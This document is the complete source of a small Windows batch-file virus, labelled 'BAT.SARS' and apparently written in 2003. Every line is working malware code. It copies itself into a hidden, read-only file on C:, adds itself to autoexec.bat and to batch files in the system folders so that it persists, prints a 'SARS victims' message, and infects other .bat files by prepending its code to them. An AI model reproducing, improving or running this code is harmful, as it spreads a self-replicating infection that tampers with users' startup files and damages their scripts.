:: Virus name: BAT.SARS
:: Written by Dr Virus Quest
:: Created on 19th June 2003
if not exist C:\BAT.SARS.bat goto infection
:install
for %%b in (*.bat) do set X=%%b
find /i "<BAT.SARS>" %X%
if not errorlevel 1 goto bye
copy /a %0+%X% x.x
erase %X%
ren x.x %X%
goto bye
:infection
copy %0 C:\BAT.SARS.bat
attrib C:\BAT.SARS.bat +h +r
echo You're now one of the SARS victims! >>C:\autoexec.bat
echo BAT.SARS.bat>>C:\autoexec.bat
echo BAT.SARS.bat>>C:\windows\system\SARS.bat
echo BAT.SARS.bat>>C:\windows\system32\SARS32.bat
goto install
:bye
